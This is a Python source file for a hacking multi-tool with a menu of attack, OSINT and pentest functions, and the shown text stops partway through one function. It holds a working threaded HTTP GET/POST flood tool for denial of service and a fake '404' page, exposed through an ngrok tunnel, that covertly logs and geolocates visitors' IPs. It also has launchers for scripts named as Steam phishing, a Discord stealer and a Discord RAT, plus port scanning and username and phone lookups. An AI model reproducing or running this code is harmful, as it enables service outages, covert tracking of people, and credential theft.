import sys
import ctypes
import ctypes.wintypes
import time
import os
import random
import math
import socket
import requests
from concurrent.futures import ThreadPoolExecutor
import string
import threading
import json
from collections import defaultdict
from requests.adapters import HTTPAdapter
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import phonenumbers
from phonenumbers import geocoder, carrier, number_type, is_valid_number, is_possible_number
from phonenumbers import NumberParseException, PhoneNumberType
from datetime import datetime
from phonenumbers import timezone as pntimezone
import urllib.parse
from pathlib import Path
import hashlib
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import ssl
import subprocess
import platform

if sys.platform == "win32":
    _k32 = ctypes.windll.kernel32
    for _hid in (-10, -11, -12):
        _h = _k32.GetStdHandle(_hid)
        _m = ctypes.wintypes.DWORD(0)
        if _k32.GetConsoleMode(_h, ctypes.byref(_m)):
            _k32.SetConsoleMode(_h, _m.value | 0x0004 | 0x0001)
    _k32.SetConsoleOutputCP(65001)
    _k32.SetConsoleCP(65001)
    if hasattr(sys.stdout, 'reconfigure'):
        try: sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        except: pass

try:
    import msvcrt
    WINDOWS = True
except ImportError:
    import tty, termios, select
    WINDOWS = False

def rgb(r, g, b):  return f'\033[38;2;{r};{g};{b}m'
def bold():        return '\033[1m'
def reset():       return '\033[0m'
def move(r, c):    return f'\033[{r};{c}H'
def clrscr():      return '\033[2J\033[H'
def hide_cur():    sys.stdout.write('\033[?25l'); sys.stdout.flush()
def show_cur():    sys.stdout.write('\033[?25h'); sys.stdout.flush()

def blend(c1, c2, t):
    return tuple(max(0, min(255, int(c1[i] + (c2[i]-c1[i])*t))) for i in range(3))

VIOLET_DARK  = (60,  0, 120)
VIOLET_MID   = (138, 43, 226)
VIOLET_LIGHT = (210, 140, 255)

def violet(tick):
    t = (math.sin(tick * 0.06) + 1) / 2
    if t < 0.5:
        return blend(VIOLET_DARK, VIOLET_MID, t * 2)
    else:
        return blend(VIOLET_MID, VIOLET_LIGHT, (t - 0.5) * 2)

MCHARS = 'アイウエオカキクケコサシスセソ01ABCDEFabcdef#@%$&*'

def matrix_intro(cols, rows, duration=3.5):
    drops  = [random.randint(-rows, 0) for _ in range(cols)]
    speeds = [random.uniform(0.5, 1.0)  for _ in range(cols)]
    trail  = 10
    steps  = int(duration / 0.05)
    sys.stdout.write(clrscr()); sys.stdout.flush()
    for _ in range(steps):
        buf = []
        for c in range(cols):
            y = int(drops[c])
            for dy in range(trail):
                row = y - dy
                if 1 <= row <= rows:
                    t = 1.0 - dy / trail
                    r = int(60  + 150 * t)
                    g = int(0)
                    b = int(120 + 135 * t)
                    ch = random.choice(MCHARS)
                    w = '\033[1m' if dy == 0 else ''
                    buf.append(f'{move(row, c+1)}{w}\033[38;2;{r};{g};{b}m{ch}{reset()}')
            erase = y - trail
            if 1 <= erase <= rows:
                buf.append(f'{move(erase, c+1)} ')
            drops[c] += speeds[c]
            if drops[c] > rows + trail:
                drops[c] = random.randint(-rows//2, 0)
                speeds[c] = random.uniform(0.5, 1.0)
        sys.stdout.write(''.join(buf)); sys.stdout.flush()
        time.sleep(0.05)
    for step in range(25):
        buf = []
        for row in range(1, rows+1):
            for col in range(1, cols+1):
                if random.random() < step / 24:
                    buf.append(f'{move(row, col)} ')
        sys.stdout.write(''.join(buf)); sys.stdout.flush()
        time.sleep(0.03)
    sys.stdout.write(clrscr()); sys.stdout.flush()

BANNER = [
    r"                              _____  .__   __          ___________           .__    ________  ",
    r"                             /  _  \ |  |_/  |_        \__    ___/___   ____ |  |   \_____  \ ",
    r"                            /  /_\  \|  |\   __\  ______ |    | /  _ \ /  _ \|  |    /  ____/ ",
    r"                           /    |    \  |_|  |   /_____/ |    |(  <_> |  <_> )  |__ /       \ ",
    r"                           \____|__  /____/__|           |____| \____/ \____/|____/ \_______ |",
    r"                                   \/                                                       \/ ",
]

COLS_DATA = [
    ("Attack", [
        ("01", "Ip Info"),
        ("02", "DDOS"),
        ("03", "Link Grabber"),
        ("04", "Phishing Steam"),
        ("05", "Stealer Discord"),
        ("06", "Mini Rat"),
    ]),
    ("Osint", [
        ("07", "Username Search"),
        ("08", "Phone Lookup"),
        ("09", "Email Tracker"),
        ("10", "Image Search"),
        ("11", "File Scan"),
        ("12", "Google Dork"),
    ]),
    ("Pentest", [
        ("13", "XSS Search"),
        ("14", "SQL Search"),
        ("15", "Vuln Scanner"),
        ("16", "Web Scanner"),
        ("17", "Wifi Scanner"),
        ("18", "Firewall Detect"),
    ]),
]

N_ROWS  = 6
COL_W   = 24
COL_GAP = 4

def _check_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        result = s.connect_ex((ip, port))
        s.close()
        if result == 0:
            return port
    except:
        pass
    return None

def _scan_ports(ip, start_port, end_port):
    open_ports = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(_check_port, ip, port) for port in range(start_port, end_port + 1)]
        for future in futures:
            result = future.result()
            if result:
                open_ports.append(result)
    return sorted(open_ports)

def _get_ip_info(ip):
    response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
    return response.json()

def run_01_ip_info():
    show_cur(); sys.stdout.write(clrscr())
    v  = rgb(*VIOLET_MID)
    vl = rgb(*VIOLET_LIGHT)
    w  = rgb(255, 255, 255)
    r0 = reset()
    b0 = bold()
    sde = (
        f"\n{v}"
        "           :----------.\n"
        "       .=-=---:.  .:-----:\n"
        "     --==:              :=--\n"
        "   .-==.                  .=-:\n"
        "  .-=-                      -=-\n"
        " .-=-                        :=:\n"
        " --=                         .--\n"
        ".-=-                          :=:\n"
        f".-=:                          :=-               {b0}Ip Info + Scan{r0}{v}\n"
        ".-=:                          :=:                      Free Version\n"
        " --=                          --.\n"
        " --=:                        :=-\n"
        "  --=:                      :=-\n"
        "   -===                    -=-.\n"
        "    .-==-               .-=-==\n"
        "      .--==-:.      .:-==--=#*=:-\n"
        "         .---========--:.   .-=***-\n"
        "              ..:...         -*###**-\n"
        "                               +####**-\n"
        "                                :*####*+=\n"
        "                                  =######+-\n"
        "                                    +######*-\n"
        "                                      *#####*:\n"
        "                                       :*####=\n"
        f"                                          .:-.{r0}\n"
    )
    print(sde)
    try:
        ip         = input(f'  {v}Enter IP address :{r0} ')
        start_port = int(input(f'  {v}Start port       :{r0} '))
        end_port   = int(input(f'  {v}End port         :{r0} '))
        print(f'\n  {v}Scanning ports on {w}{b0}{ip}{r0}{v}...{r0}')
        open_ports = _scan_ports(ip, start_port, end_port)
        if open_ports:
            print(f'\n  {vl}{b0}Open ports:{r0}')
            for port in open_ports:
                print(f'    {v}Port {w}{b0}{port}{r0}{v} is open{r0}')
        else:
            print(f'\n  {v}No open ports found.{r0}')
        print(f'\n  {v}Retrieving IP info for {w}{b0}{ip}{r0}{v}...{r0}')
        data = _get_ip_info(ip)
        if data.get('status') == 'success':
            fields = [
                ('Country',      data.get('country',     'N/A')),
                ('Country Code', data.get('countryCode', 'N/A')),
                ('Region',       data.get('regionName',  'N/A')),
                ('City',         data.get('city',        'N/A')),
                ('ZIP',          data.get('zip',         'N/A')),
                ('Latitude',     data.get('lat',         'N/A')),
                ('Longitude',    data.get('lon',         'N/A')),
                ('Timezone',     data.get('timezone',    'N/A')),
                ('ISP',          data.get('isp',         'N/A')),
                ('AS',           data.get('as',          'N/A')),
                ('IP Address',   data.get('query',       'N/A')),
            ]
            print()
            for key, val in fields:
                print(f'    {v}{key:<14}{r0}: {w}{val}{r0}')
        else:
            print(f'\n  Error: {data.get("message", "Unknown error")}')
    except ValueError:
        print(f'\n  {v}Invalid port number.{r0}')
    except Exception as e:
        print(f'\n  Error: {e}')
    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_02_port_scanner():
    show_cur(); sys.stdout.write(clrscr())

    class RequestStats:
        def __init__(self):
            self.total = 0
            self.success = 0
            self.failed = 0
            self.response_times = []
            self.status_codes = defaultdict(int)
            self.lock = threading.Lock()

        def add_result(self, success, response_time, status_code):
            with self.lock:
                self.total += 1
                if success:
                    self.success += 1
                else:
                    self.failed += 1
                self.response_times.append(response_time)
                self.status_codes[status_code] += 1

        def get_stats(self):
            with self.lock:
                if not self.response_times:
                    return None
                sorted_times = sorted(self.response_times)
                return {
                    'total': self.total,
                    'success': self.success,
                    'failed': self.failed,
                    'avg_time': sum(self.response_times) / len(self.response_times),
                    'min_time': min(self.response_times),
                    'max_time': max(self.response_times),
                    'median_time': sorted_times[len(sorted_times) // 2],
                    'status_codes': dict(self.status_codes)
                }

    def create_optimized_session():
        session = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'UltraFastClient/2.0'
        })
        return session

    def generate_random_params():
        return {
            'id': random.randint(1, 100000),
            'cache': ''.join(random.choices(string.ascii_letters + string.digits, k=8)),
            'ts': int(time.time() * 1000)
        }

    def generate_random_payload():
        return {
            'id': random.randint(1, 1000000),
            'data': ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
            'timestamp': int(time.time() * 1000),
            'random': ''.join(random.choices(string.ascii_letters, k=10)),
            'value': random.randint(1, 10000)
        }

    def send_burst_requests(url, method, stats, count, session, data_payload=None, randomize_params=False):
        for i in range(count):
            start_time = time.perf_counter()
            try:
                if method == 'GET':
                    params = generate_random_params() if randomize_params else None
                    response = session.get(url, params=params, timeout=5)
                elif method == 'POST':
                    response = session.post(url, json=data_payload, timeout=5)
                elif method == 'PUT':
                    response = session.put(url, json=data_payload, timeout=5)
                elif method == 'DELETE':
                    response = session.delete(url, timeout=5)
                elif method == 'PATCH':
                    response = session.patch(url, json=data_payload, timeout=5)
                else:
                    response = session.get(url, timeout=5)
                response_time = time.perf_counter() - start_time
                stats.add_result(True, response_time, response.status_code)
            except Exception:
                response_time = time.perf_counter() - start_time
                stats.add_result(False, response_time, 0)

    def get_flood_worker(url, stats, duration, randomize_params):
        session = create_optimized_session()
        end_time = time.time() + duration
        try:
            while time.time() < end_time:
                start_time = time.perf_counter()
                try:
                    params = generate_random_params() if randomize_params else None
                    response = session.get(url, params=params, timeout=3)
                    response_time = time.perf_counter() - start_time
                    stats.add_result(True, response_time, response.status_code)
                except Exception:
                    response_time = time.perf_counter() - start_time
                    stats.add_result(False, response_time, 0)
        finally:
            session.close()

    def post_flood_worker(url, stats, duration, randomize_data, custom_payload):
        session = create_optimized_session()
        end_time = time.time() + duration
        try:
            while time.time() < end_time:
                start_time = time.perf_counter()
                try:
                    data = generate_random_payload() if randomize_data else custom_payload
                    response = session.post(url, json=data, timeout=3)
                    response_time = time.perf_counter() - start_time
                    stats.add_result(True, response_time, response.status_code)
                except Exception:
                    response_time = time.perf_counter() - start_time
                    stats.add_result(False, response_time, 0)
        finally:
            session.close()

    def aggressive_worker(url, method, stats, requests_count, data_payload, randomize_params=False):
        session = create_optimized_session()
        try:
            send_burst_requests(url, method, stats, requests_count, session, data_payload, randomize_params)
        finally:
            session.close()

    def print_progress(stats, start_time):
        while True:
            time.sleep(0.5)
            current = stats.total
            elapsed = time.time() - start_time
            if elapsed > 0:
                rate = current / elapsed
                sys.stdout.write(f"\r Requests sent: {current} | Speed: {rate:.0f} req/s | Success: {stats.success} | Failed: {stats.failed}")
                sys.stdout.flush()

    def print_stats(stats, duration):
        result = stats.get_stats()
        if not result:
            print("\n No statistics available")
            return
        print("                    FINAL STATISTICS")
        print(f"\n Summary:")
        print(f"   Total requests   : {result['total']:,}")
        print(f"   Success          : {result['success']:,} ({result['success']/result['total']*100:.1f}%)")
        print(f"   Failed           : {result['failed']:,} ({result['failed']/result['total']*100:.1f}%)")
        print(f"   Total duration   : {duration:.2f}s")
        print(f"   Requests/second  : {result['total']/duration:.0f}")
        print(f"\n Response times:")
        print(f"   Minimum  : {result['min_time']*1000:.1f}ms")
        print(f"   Maximum  : {result['max_time']*1000:.1f}ms")
        print(f"   Average  : {result['avg_time']*1000:.1f}ms")
        print(f"   Median   : {result['median_time']*1000:.1f}ms")
        print(f"\n HTTP status codes:")
        for code, count in sorted(result['status_codes'].items()):
            if code == 0:
                print(f"   Network errors : {count:,}")
            else:
                print(f"   {code}            : {count:,}")

    def run_get_flood_mode():
        print("           GET FLOOD MODE ACTIVE")
        url = input(" Target URL: ").strip()
        if not url:
            print(" URL required!")
            return
        threads_input = input(" Number of threads [100]: ").strip()
        num_threads = int(threads_input) if threads_input else 100
        duration_input = input(" Flood duration in seconds [30]: ").strip()
        duration = int(duration_input) if duration_input else 30
        randomize = input(" Randomize GET parameters? [Y/n]: ").strip().lower()
        randomize_params = randomize != 'n'
        confirm = input("\n LAUNCH GET FLOOD? [Y/n]: ").strip().lower()
        if confirm and confirm != 'y':
            print(" Flood cancelled")
            return
        stats = RequestStats()
        start_time = time.time()
        threading.Thread(target=print_progress, args=(stats, start_time), daemon=True).start()
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(get_flood_worker, url, stats, duration, randomize_params) for _ in range(num_threads)]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
        print_stats(stats, time.time() - start_time)

    def run_post_flood_mode():
        print("           POST FLOOD MODE ACTIVE")
        url = input(" Target URL: ").strip()
        if not url:
            print(" URL required!")
            return
        threads_input = input(" Number of threads [100]: ").strip()
        num_threads = int(threads_input) if threads_input else 100
        duration_input = input(" Flood duration in seconds [30]: ").strip()
        duration = int(duration_input) if duration_input else 30
        randomize = input(" Randomize JSON payload? [Y/n]: ").strip().lower()
        randomize_data = randomize != 'n'
        custom_payload = {"attack": "post_flood", "timestamp": int(time.time())}
        if not randomize_data:
            use_custom = input(" Use a custom payload? [y/N]: ").strip().lower()
            if use_custom == 'y':
                data_input = input(" JSON data: ").strip()
                if data_input:
                    try:
                        custom_payload = json.loads(data_input)
                    except Exception:
                        print(" Invalid JSON, using default payload")
        confirm = input("\n LAUNCH POST FLOOD? [Y/n]: ").strip().lower()
        if confirm and confirm != 'y':
            print(" Flood cancelled")
            return
        stats = RequestStats()
        start_time = time.time()
        threading.Thread(target=print_progress, args=(stats, start_time), daemon=True).start()
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(post_flood_worker, url, stats, duration, randomize_data, custom_payload) for _ in range(num_threads)]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
        print_stats(stats, time.time() - start_time)

    def run_standard_mode():
        url = input(" Server URL: ").strip()
        if not url:
            print(" URL required!")
            return
        method = input(" HTTP method [GET]: ").strip().upper() or "GET"
        threads_input = input(" Number of threads [50]: ").strip()
        num_threads = int(threads_input) if threads_input else 50
        requests_input = input(" Total number of requests [10000]: ").strip()
        total_requests = int(requests_input) if requests_input else 10000
        randomize_params = False
        if method == 'GET':
            randomize = input(" Randomize GET parameters? [y/N]: ").strip().lower()
            randomize_params = randomize == 'y'
        data_payload = None
        if method in ['POST', 'PUT', 'PATCH']:
            use_data = input(" Use a JSON payload? [y/N]: ").strip().lower()
            if use_data == 'y':
                data_input = input(" JSON data: ").strip()
                if data_input:
                    try:
                        data_payload = json.loads(data_input)
                    except Exception:
                        data_payload = {"attack": "stress_test"}
                else:
                    data_payload = {"attack": "stress_test"}
            else:
                data_payload = {"attack": "stress_test"}
        confirm = input("\n WARNING: intensive attack! Launch? [Y/n]: ").strip().lower()
        if confirm and confirm != 'y':
            print(" Test cancelled")
            return
        stats = RequestStats()
        requests_per_thread = total_requests // num_threads
        remaining_requests = total_requests % num_threads
        start_time = time.time()
        threading.Thread(target=print_progress, args=(stats, start_time), daemon=True).start()
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = []
            for i in range(num_threads):
                req_count = requests_per_thread + (1 if i < remaining_requests else 0)
                futures.append(executor.submit(aggressive_worker, url, method, stats, req_count, data_payload, randomize_params))
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
        print_stats(stats, time.time() - start_time)

    print(" Available modes:")
    print("   1. Standard Mode")
    print("   2. GET FLOOD Mode")
    print("   3. POST FLOOD Mode")
    mode = input("\n Choose a mode [1]: ").strip() or "1"

    if mode == "2":
        run_get_flood_mode()
    elif mode == "3":
        run_post_flood_mode()
    else:
        run_standard_mode()



    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()


def run_03_ping_sweep():
    show_cur(); sys.stdout.write(clrscr())

    v  = rgb(*VIOLET_MID)
    vl = rgb(*VIOLET_LIGHT)
    w  = rgb(255, 255, 255)
    r0 = reset()
    b0 = bold()

    sde = (
        f"\n{v}"
        "           :----------.\n"
        "       .=-=---:.  .:-----:\n"
        "     --==:              :=--\n"
        "   .-==.                  .=-:\n"
        "  .-=-                      -=-\n"
        " .-=-                        :=:\n"
        " --=                         .--\n"
        ".-=-                          :=:\n"
        f".-=:                          :=-               {b0}IP Logger Web{r0}{v}\n"
        ".-=:                          :=:                      Free Version\n"
        " --=                          --.\n"
        " --=:                        :=-\n"
        "  --=:                      :=-\n"
        "   -===                    -=-.\n"
        "    .-==-               .-=-==\n"
        "      .--==-:.      .:-==--=#*=:-\n"
        "         .---========--:.   .-=***-\n"
        "              ..:...         -*###**-\n"
        "                               +####**-\n"
        "                                :*####*+=\n"
        "                                  =######+-\n"
        "                                    +######*-\n"
        "                                      *#####*:\n"
        "                                       :*####=\n"
        f"                                          .:-.{r0}\n"
    )

    print(sde)

    try:
        from flask import Flask, request, jsonify, render_template_string
        import requests
        from pyngrok import ngrok

        app = Flask(__name__)

        def get_real_ip(req):
            if req.headers.get('X-Forwarded-For'):
                return req.headers.get('X-Forwarded-For').split(',')[0]
            return req.remote_addr

        def get_ip_info(ip):
            try:
                return requests.get(f"http://ip-api.com/json/{ip}").json()
            except:
                return None

        @app.route('/')
        def index():
            return render_template_string("""
            <!doctype html>
            <html>
            <head>
                <title>IP Information</title>
            </head>
            <body style="background:black; color:white; font-family:monospace;">
                <h2 style="color:violet;">ERROR 404</h2>
                <p></p>
                <p></p>

                <script>
                    fetch('/report_ip', { method: 'POST' });
                </script>
            </body>
            </html>
            """)

        @app.route('/report_ip', methods=['POST'])
        def report_ip():
            user_ip = get_real_ip(request)

            print(f"\n{vl}[+] Visitor IP:{r0} {w}{b0}{user_ip}{r0}")

            ip_info = get_ip_info(user_ip)
            if ip_info:
                print(f"{vl}[+] IP Information:{r0}")
                for k, v_ in ip_info.items():
                    print(f"   {v}{k:<12}{r0}: {w}{v_}{r0}")
            else:
                print(f"{v}[-] Failed to retrieve IP information{r0}")

            return jsonify({'status': 'ok'})

        token = input(f"{v}Enter ngrok token : {r0}")
        ngrok.set_auth_token(token)

        port = int(input(f"{v}Enter port       : {r0}"))

        tunnel = ngrok.connect(port)
        print(f"\n{vl}Public URL:{r0} {w}{b0}{tunnel.public_url}{r0}")
        print(f"{v}Waiting for connection...{r0}")

        app.run(port=port)

    except ValueError:
        print(f"\n{v}Invalid port.{r0}")
    except Exception as e:
        print(f"\n{v}Error: {w}{e}{r0}")

    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_04_traceroute():
    show_cur(); sys.stdout.write(clrscr())
    os.startfile("Steam-Phishing.py")
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_05_dns_lookup():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    os.startfile("Server-discord.py")
    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_06_whois():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    os.startfile("Discord-Rat.py")
    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_07_username_search():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()

    efcm = (
        f"{v}"
        "             .....................           \n"
        "          :*########************+++=.        ╔╗ ╔╗                                ╔╗             ╔╗\n"
        "        .-#############***********+++.       ║║ ║║                               ╔╝╚╗            ║║\n"
        "        .-%#:.....................-+*:       ║║ ║║╔══╗╔══╗╔═╗╔═╗ ╔══╗ ╔╗╔╗╔══╗   ╚╗╔╝╔═╗╔══╗ ╔══╗║║╔╗╔══╗╔═╗\n"
        "        .-%*.                     :+*:       ║║ ║║║══╣║╔╗║║╔╝║╔╗╗╚ ╗║ ║╚╝║║╔╗║    ║║ ║╔╝╚ ╗║ ║╔═╝║╚╝╝║╔╗║║╔╝\n"
        "        .-%*.                     :+*:       ║╚═╝║╠══║║║═╣║║ ║║║║║╚╝╚╗║║║║║║═╣    ║╚╗║║ ║╚╝╚╗║╚═╗║╔╗╗║║═╣║║\n"
        "      .-=-:-.   .::-======--:..   .:::::.    ╚═══╝╚══╝╚══╝╚╝ ╚╝╚╝╚═══╝╚╩╩╝╚══╝    ╚═╝╚╝ ╚═══╝╚══╝╚╝╚╝╚══╝╚╝\n"
        "     .%%%%#. .:+#%##########***=.. :+**+=.   \n"
        "    .=%%%%%+.+%%%%%%%##########**-.=*****:.                 Username Tracker By AltWolf\n"
        "   .%%%%%%%*=%%%%%%%%%%%##########-+******=                         Version free\n"
        "   .%%%%%%%+#%%%%%%%%%############=+******=. \n"
        "    .-+=:..:+%#%#+---+%%#+---+##*#-...:--:.  \n"
        "            :#%*.    -#%*:    .+#+.               \n"
        "            .-%*.  .=#%%%#-.  .*#-                        \n"
        "    .-=-:..::*%%%##%%%%#%%%%**%%%+:...:--:.  \n"
        "   .%%%%%%%#=%%%%%%%%%+.+%%%%%%%%%-*%%%%%%+. \n"
        "   .%%%%%%%%=#%%%%%%%%#*#%%%%%%%%++%%%%%%%+. \n"
        "    .+%%%%%*....:=%%%%%%%%%%#-... .*%%%%%-.  \n"
        "     :%@%%%:     -%%%%%%%%%%*:     -%%%%#.   \n"
        "      :+*+:-.    .:-+*#***=-.     :::=+=.    \n"
        "        .=%%.                     :%%:.      \n"
        "        .+@%.                     :%%-       \n"
        "        .+@%:.....................=%%-       \n"
        "        .+@@@@@@@@@@@%%%%%%%%%%%%%%%%-       \n"
        "        .+@@@@@@@@@@@%%%%%%%%%%%%%%%%-       \n"
        "        .=@@@@@@@@@%%%%%%%%%%%%%%%%%%:       \n"
        f"         .=@@@@@@@@@@@@@@@@@@@@%%%%#-.{r0}\n"
    )
    print(efcm)

    def search_username(username):
        profiles = {}
        social_media = {
            "Instagram":   f"https://www.instagram.com/{username}",
            "Twitter":     f"https://twitter.com/{username}",
            "TikTok":      f"https://www.tiktok.com/@{username}",
            "YouTube":     f"https://www.youtube.com/@{username}",
            "Facebook":    f"https://www.facebook.com/{username}",
            "Twitch":      f"https://www.twitch.tv/{username}",
            "Snapchat":    f"https://www.snapchat.com/add/{username}",
            "Discord":     f"https://discord.com/users/{username}",
            "Steam":       f"https://steamcommunity.com/id/{username}",
            "Xbox Live":   f"https://account.xbox.com/en-US/Profile?GamerTag={username}",
            "PlayStation": f"https://psnprofiles.com/{username}",
            "Reddit":      f"https://www.reddit.com/user/{username}",
            "LinkedIn":    f"https://www.linkedin.com/in/{username}",
            "GitHub":      f"https://github.com/{username}",
            "Pinterest":   f"https://www.pinterest.com/{username}",
            "Telegram":    f"https://t.me/{username}",
            "Tumblr":      f"https://{username}.tumblr.com",
            "Spotify":     f"https://open.spotify.com/user/{username}",
            "SoundCloud":  f"https://soundcloud.com/{username}",
            "Medium":      f"https://medium.com/@{username}",
            "Patreon":     f"https://www.patreon.com/{username}",
            "Roblox":      f"https://www.roblox.com/users/profile?username={username}",
            "Fortnite":    f"https://fortnitetracker.com/profile/all/{username}",
            "Vimeo":       f"https://vimeo.com/{username}",
            "Flickr":      f"https://www.flickr.com/people/{username}",
            "DeviantArt":  f"https://www.deviantart.com/{username}",
            "Dribbble":    f"https://dribbble.com/{username}",
            "Behance":     f"https://www.behance.net/{username}",
            "Keybase":     f"https://keybase.io/{username}",
            "HackerOne":   f"https://hackerone.com/{username}",
            "Codecademy":  f"https://www.codecademy.com/profiles/{username}",
            "About.me":    f"https://about.me/{username}",
            "Badoo":       f"https://badoo.com/@{username}",
            "Meetup":      f"https://www.meetup.com/members/{username}",
            "Slack":       f"https://{username}.slack.com",
            "Blogger":     f"https://{username}.blogspot.com",
        }

        print(f"  Searching for username: {username}")
        print("  This may take a moment...\n")

        for platform, url in social_media.items():
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    profiles[platform] = url
                    print(f"  [+] Found: {platform}")
            except Exception:
                pass

        return profiles

    def display_results(profiles):
        print("\n" + "=" * 50)
        if not profiles:
            print("  No profiles found.")
        else:
            print(f"  Found {len(profiles)} profile(s):\n")
            for platform, url in profiles.items():
                print(f"    {platform}: {url}")
        print("=" * 50)

    username = input("  Enter username to search: ")
    profiles = search_username(username)
    display_results(profiles)

    print(f'\n  {v}{b0}[ Username Search ]{r0}\n')
    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_08_phone_lookup():
    show_cur(); sys.stdout.write(clrscr())

    LINE_TYPE_MAP = {
        PhoneNumberType.MOBILE: "Mobile",
        PhoneNumberType.FIXED_LINE: "Fixed Line",
        PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed Line or Mobile",
        PhoneNumberType.TOLL_FREE: "Toll Free",
        PhoneNumberType.PREMIUM_RATE: "Premium Rate",
        PhoneNumberType.SHARED_COST: "Shared Cost",
        PhoneNumberType.VOIP: "VoIP",
        PhoneNumberType.PERSONAL_NUMBER: "Personal Number",
        PhoneNumberType.PAGER: "Pager",
        PhoneNumberType.UAN: "UAN",
        PhoneNumberType.VOICEMAIL: "Voicemail",
        PhoneNumberType.UNKNOWN: "Unknown",
    }

    def print_field(label, value, width=22):
        print(f"  {label:<{width}}: {value}")

    def normalize(raw):
        raw = raw.strip()
        if not raw.startswith("+"):
            raw = "+" + raw
        return raw

    def scan():
        print()
        print("  Enter any number in international format.")
        print("  Examples : +12025550123 / +447911123456 / +8613012345678")
        print()
        raw = input("  Phone number: ").strip()

        if not raw:
            print("\n  No input provided.")
            input("  Press Enter to continue...")
            return

        try:
            normalized = normalize(raw)
            parsed = phonenumbers.parse(normalized, None)

            region = geocoder.description_for_number(parsed, "en") or "Unknown"
            phone_carrier = carrier.name_for_number(parsed, "en") or "Unknown"
            line_kind = LINE_TYPE_MAP.get(number_type(parsed), "Unknown")
            valid = "Yes" if is_valid_number(parsed) else "No"
            possible = "Yes" if is_possible_number(parsed) else "No"
            national = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
            international = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
            e164 = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
            timezones = ", ".join(pntimezone.time_zones_for_number(parsed)) or "Unknown"

            e164_clean = e164.replace("+", "")
            national_clean = national.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")

            print()
            print("  ── PHONE INFO ──────────────────────────────────")
            print()
            print_field("International", international)
            print_field("National", national)
            print_field("E164", e164)
            print_field("Country Code", f"+{parsed.country_code}")
            print_field("Region / Country", region)
            print_field("Carrier", phone_carrier)
            print_field("Line Type", line_kind)
            print_field("Timezone", timezones)
            print_field("Valid", valid)
            print_field("Possible", possible)
            print()
            print("  ── OSINT LINKS ─────────────────────────────────")
            print()

            links = [
                ("Truecaller",    f"https://www.truecaller.com/search/us/{e164_clean}"),
                ("Sync.me",       f"https://sync.me/search/?number={e164}"),
                ("SpyDialer",     f"https://spydialer.com/default.aspx?phone={national_clean}"),
                ("CallerID Test", f"https://calleridtest.com/lookup?phone={e164_clean}"),
                ("Mr. Number",    f"https://mrnumber.com/{e164_clean}"),
                ("WhoCallsMe",    f"https://www.whocalledme.com/PhoneNumber/{national_clean}"),
                ("800notes",      f"https://800notes.com/Phone.aspx/{national_clean}"),
                ("Tellows",       f"https://www.tellows.com/num/{e164_clean}"),
                ("Numverify",     f"https://numverify.com/"),
                ("HLR Lookup",    f"https://www.hlrlookup.com/"),
            ]

            for name, url in links:
                print(f"  {name:<16} {url}")

            print()

        except NumberParseException as exc:
            print(f"\n  Failed to parse: {exc}")
        except Exception as exc:
            print(f"\n  Unexpected error: {exc}")

        input("  Press Enter to return to menu...")

    while True:
        sys.stdout.write(clrscr())
        print()
        print("  PHONE NUMBER SCANNER")
        print()
        print("  [1] Scan a phone number")
        print("  [2] Exit")
        print()
        choice = input("  > ").strip()

        if choice == "1":
            scan()
        elif choice == "2":
            sys.stdout.write(clrscr())
            break

    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_09_email_tracker():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()

    typn = (
        f"\n{v}"
        "      ...                        ...      \n"
        "   .-*****-                    .-----:.   \n"
        "   .********+.              .==-------.   \n"
        "   .********+++-.        .:+++=-------.   \n"
        "   .********++++++:.   .=+++++=-------:   \n"
        f"   .+++*****++++++++=-++++++++=----=++:   {b0}Email Tracker By AltWolf{r0}{v}\n"
        "   .+++++***++++++++++++++++++=-=+++++:        Version Free\n"
